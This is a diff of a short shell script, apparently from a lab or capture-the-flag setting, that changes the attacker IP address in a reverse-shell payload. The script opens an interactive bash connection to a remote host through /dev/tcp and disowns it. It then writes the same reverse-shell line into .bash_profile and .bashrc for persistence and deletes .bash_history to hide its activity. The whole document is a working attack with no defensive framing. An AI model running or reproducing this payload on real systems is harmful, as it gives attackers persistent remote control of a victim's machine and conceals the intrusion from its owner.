@@ -1,6 +1,6 @@
-bash -c "bash -i >& /dev/tcp/10.128.195.215/1337 0>&1 &"
+bash -c "bash -i >& /dev/tcp/10.128.194.150/1337 0>&1 &"
 disown
 cd
-echo "bash -i >& /dev/tcp/10.128.195.215/1337 0>&1" >> .bash_profile
-echo "bash -i >& /dev/tcp/10.128.195.215/1337 0>&1" >> .bashrc
+echo "bash -i >& /dev/tcp/10.128.194.150/1337 0>&1" >> .bash_profile
+echo "bash -i >& /dev/tcp/10.128.194.150/1337 0>&1" >> .bashrc
 rm .bash_history
